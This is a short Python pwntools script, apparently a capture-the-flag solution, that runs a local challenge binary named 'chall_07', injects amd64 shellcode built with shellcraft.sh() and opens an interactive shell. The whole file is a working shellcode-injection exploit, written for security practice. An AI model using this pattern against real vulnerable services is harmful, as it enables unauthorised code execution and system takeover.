from pwn import *
def main():
	p = process("./chall_07")
	p.sendline()
	context.arch = "amd64"
	p.sendline(asm(shellcraft.sh()))
	p.interactive()
main()
